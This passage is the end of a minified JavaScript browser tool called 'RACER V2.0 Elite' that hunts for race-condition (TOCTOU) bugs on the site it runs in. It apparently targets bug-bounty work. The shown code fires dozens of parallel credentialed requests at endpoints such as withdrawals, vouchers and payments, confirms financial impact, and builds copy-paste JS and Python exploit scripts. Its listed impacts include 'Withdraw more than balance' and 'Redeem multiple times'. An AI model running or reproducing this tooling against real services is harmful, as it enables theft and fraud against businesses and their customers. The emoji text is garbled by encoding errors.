VERIFIED:</strong><br>';v.results.stateVerification.proof.forEach(function(p){h+='<p style="margin:3px 0;color:#10b981">â€¢ '+p+'</p>'})}h+='<br><strong style="color:#a78bfa">ğŸ’¥ IMPACT:</strong><br>';h+='<p style="margin:5px 0;line-height:1.6">';if(v.category){if(v.category.includes('Withdrawal')||v.category.includes('Balance')||v.category.includes('Transfer')){h+='ğŸ’° Withdraw more than balance<br>'}if(v.category.includes('Voucher')||v.category.includes('Coupon')||v.category.includes('Gift')){h+='ğŸ« Redeem multiple times<br>'}if(v.category.includes('Purchase')||v.category.includes('Payment')){h+='ğŸ’³ Purchase without funds<br>'}if(v.category.includes('Invitation')||v.category.includes('Join')){h+='ğŸ“§ Bypass limits<br>'}}h+='âš¡ TOCTOU vulnerability<br>';if(v.results.stateVerification.verified){h+='<strong style="color:#ef4444">âœ“ Financial impact confirmed</strong><br>'}h+='</p>';if(v.bounty){h+='<div class="bounty-est">';h+='ğŸ’° <strong>Bounty:</strong> $'+v.bounty[0].toLocaleString()+' - $'+v.bounty[1].toLocaleString();h+='</div>'}h+='<br><strong style="color:#a78bfa">âš¡ QUICK EXPLOIT:</strong><br>';h+='<div class="code">const promises=[];\nfor(let i=0;i<'+v.count+';i++){\n  promises.push(\n    fetch("'+v.endpoint+'",{\n      method:"'+v.method+'",\n';if(v.body){h+='      body:\''+v.body+'\',\n'}h+='      credentials:"include"\n    })\n  );\n}\nPromise.all(promises).then(r=>{\n  console.log("âœ“",r.filter(x=>x.ok).length);\n});</div>';h+='<div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">';h+='<button class="btn" onclick="window.copyJSExploit('+i+')">ğŸ“‹ Copy JS</button>';h+='<button class="btn" onclick="window.copyPythonExploit('+i+')">ğŸ Copy Python</button>';h+='<button class="btn" onclick="window.reRunTest('+i+')">ğŸ”„ Re-Test</button>';h+='</div>';h+='</div>'})}document.getElementById('rac-exploits').innerHTML=h}async function runManualTest(endpoint,method,body,count,expected){var progressDiv=document.getElementById('racProgress');progressDiv.innerHTML='<div class="progress"><div class="progress-bar" style="width:0%"></div></div><p style="color:#a78bfa;margin-top:12px;font-weight:600">ğŸ Launching '+count+' parallel requests...</p><p style="color:#64748b;font-size:11px;margin-top:5px">â³ Please wait...</p>';var progBar=document.querySelector('#racProgress .progress-bar');var interval=setInterval(function(){var width=parseInt(progBar.style.width)||0;if(width<90){progBar.style.width=(width+5)+'%'}},150);try{var candidates=analyzeForRaceConditions(RAC.captured);var matchingCandidate=candidates.find(function(c){return c.endpoint===endpoint});var results=await testRaceCondition(endpoint,method,body,null,count);clearInterval(interval);progBar.style.width='100%';var vuln=isVulnerable(results,expected);var testData={endpoint:endpoint,method:method,body:body,count:count,expected:expected,results:results,vulnerable:vuln,category:matchingCandidate?matchingCandidate.category:'Manual Test',bounty:matchingCandidate?matchingCandidate.bounty:[1000,10000],headers:results.responses[0]?.headers||{},timestamp:Date.now()};RAC.tested.push(endpoint);RAC.results.push(testData);if(vuln.vulnerable){RAC.vulnerable.push(endpoint)}var resultClass=vuln.vulnerable?(vuln.severity.includes('VERIFIED')?'verified':'vulnerable'):'safe';var html='<div class="test-box '+resultClass+'">';html+='<strong style="font-size:16px">'+(vuln.vulnerable?'ğŸ”´ RACE DETECTED!':'âœ… NO RACE')+'</strong>';if(vuln.vulnerable&&results.stateVerification.verified){html+=' <span class="badge verified">âœ“ VERIFIED</span>'}html+='<br><br>';html+='<strong>Results:</strong><br>';html+='<span style="color:#10b981">âœ“ '+results.success+'</span> | ';html+='<span style="color:#ef4444">âœ— '+results.fail+'</span><br>';html+='â± '+results.duration+'ms<br>';html+='ğŸ“Š Avg: '+(results.timing.reduce(function(a,b){return a+b},0)/results.timing.length).toFixed(0)+'ms<br><br>';if(vuln.vulnerable){html+='<strong style="color:#ef4444">âš ï¸ Details:</strong><br>';html+='<span style="color:#ef4444">'+vuln.reason+'</span><br>';html+='<strong>Severity:</strong> '+vuln.severity+'<br>';html+='<strong>Confidence:</strong> '+vuln.confidence+'%<br>';if(results.stateVerification.verified){html+='<br><strong style="color:#10b981">âœ“ PROOF:</strong><br>';results.stateVerification.proof.forEach(function(p){html+='<span style="color:#10b981">â€¢ '+p+'</span><br>'});html+='<strong>Impact:</strong> '+results.stateVerification.impact+'<br>'}}else{html+='<span style="color:#10b981">'+vuln.reason+'</span>'}html+='<br><div style="margin-top:20px;display:flex;gap:10px">';html+='<button class="btn" onclick="document.querySelector(\'[data-tab=\\\'results\\\']\').click()">ğŸ“Š Results</button>';if(vuln.vulnerable){html+='<button class="btn success" onclick="document.querySelector(\'[data-tab=\\\'exploits\\\']\').click()">ğŸ’£ Exploit</button>'}html+='</div>';html+='</div>';progressDiv.innerHTML=html;renderResults();renderExploits()}catch(err){clearInterval(interval);progressDiv.innerHTML='<div class="test-box" style="border-left-color:#ef4444"><strong style="color:#ef4444">âŒ ERROR</strong><br><br>'+err.message+'</div>';console.error('[RACER]',err)}}window.testRaceFromDetect=async function(idx){var candidates=analyzeForRaceConditions(RAC.captured);var c=candidates[idx];if(!c){return}document.querySelector('[data-tab="manual"]').click();setTimeout(function(){document.getElementById('racEndpoint').value=c.endpoint;document.getElementById('racMethod').value=c.method;if(c.body){try{document.getElementById('racBody').value=typeof c.body==='string'?c.body:JSON.stringify(c.body)}catch(e){}}document.getElementById('racCount').value=50;document.getElementById('racExpected').value=1;document.getElementById('racStartManual').click()},200)};window.switchToResults=function(){document.querySelector('[data-tab="results"]').click()};window.copyJSExploit=function(idx){var vulns=RAC.results.filter(function(r){return r.vulnerable.vulnerable});var v=vulns[idx];var exploit='// RACER V2.0 Elite - JS Exploit\n// Target: '+v.endpoint+'\n// Severity: '+v.vulnerable.severity+'\n\n(async()=>{\n  console.log("[RACER] ğŸ Starting...");\n  const p=[];\n  for(let i=0;i<'+v.count+';i++){\n    p.push(fetch("'+v.endpoint+'",{\n      method:"'+v.method+'",\n';if(v.body){exploit+='      body:\''+v.body+'\',\n'}exploit+='      credentials:"include"\n    }));\n  }\n  const r=await Promise.all(p);\n  const s=r.filter(x=>x.ok).length;\n  console.log("[RACER] âœ“ Success:",s);\n  console.log("[RACER] âœ— Failed:",r.length-s);\n  if(s>'+v.expected+')console.log("[RACER] ğŸ”´ RACE DETECTED!");\n})();\n';copyToClipboard(exploit);alert('âœ… JS exploit copied!\n\nPaste in console.')};window.copyPythonExploit=function(idx){var vulns=RAC.results.filter(function(r){return r.vulnerable.vulnerable});var v=vulns[idx];var exploit=generateAdvancedExploit(v);copyToClipboard(exploit);alert('âœ… Python exploit copied!\n\nSave as exploit.py\nRun: python3 exploit.py')};window.reRunTest=function(idx){var vulns=RAC.results.filter(function(r){return r.vulnerable.vulnerable});var v=vulns[idx];document.querySelector('[data-tab="manual"]').click();setTimeout(function(){document.getElementById('racEndpoint').value=v.endpoint;document.getElementById('racMethod').value=v.method;if(v.body){document.getElementById('racBody').value=v.body}document.getElementById('racCount').value=v.count;document.getElementById('racExpected').value=v.expected},100)};function copyToClipboard(text){var ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta)}document.getElementById('racClose').onclick=function(){panel.remove()};document.getElementById('racExport').onclick=function(){var report={version:'2.0 Elite',timestamp:new Date().toISOString(),url:window.location.href,summary:{captured:RAC.captured.length,candidates:analyzeForRaceConditions(RAC.captured).length,tested:RAC.tested.length,vulnerable:RAC.vulnerable.length},results:RAC.results,vulnerable:RAC.results.filter(function(r){return r.vulnerable.vulnerable})};var blob=new Blob([JSON.stringify(report,null,2)],{type:'application/json'});var url=URL.createObjectURL(blob);var a=document.createElement('a');a.href=url;a.download='racer-elite-'+Date.now()+'.json';a.click();URL.revokeObjectURL(url);alert('âœ… Report exported!\n\nRequests: '+report.summary.captured+'\nCandidates: '+report.summary.candidates+'\nTested: '+report.summary.tested+'\nVulnerable: '+report.summary.vulnerable)};document.querySelectorAll('#racer .tab').forEach(function(t){t.onclick=function(){document.querySelectorAll('#racer .tab').forEach(function(x){x.classList.remove('active')});this.classList.add('active');document.querySelectorAll('#racer .tc').forEach(function(c){c.style.display='none'});var tabId='rac-'+this.dataset.tab;document.getElementById(tabId).style.display='block'}});renderDetect();renderManual();renderResults();renderExploits();setInterval(function(){if(RAC.captured.length>0){renderDetect()}},3000);console.log('%câ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—','color:#a78bfa;font-weight:bold;font-size:13px');console.log('%câ•‘   RACER V2.0 ELITE - PREMIUM EDITION                      â•‘','color:#a78bfa;font-weight:bold;font-size:13px');console.log('%câ•‘   Enhanced UI + H1 Patterns + State Verification          â•‘','color:#a78bfa;font-weight:bold;font-size:13px');console.log('%câ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•','color:#a78bfa;font-weight:bold;font-size:13px');console.log('%c[RACER] âœ… Initialized','color:#10b981;font-weight:bold');console.log('%c[RACER] ğŸ“¡ Capturing...','color:#10b981');console.log('%c[RACER] ğŸ¯ 12 elite H1 patterns','color:#10b981')})();
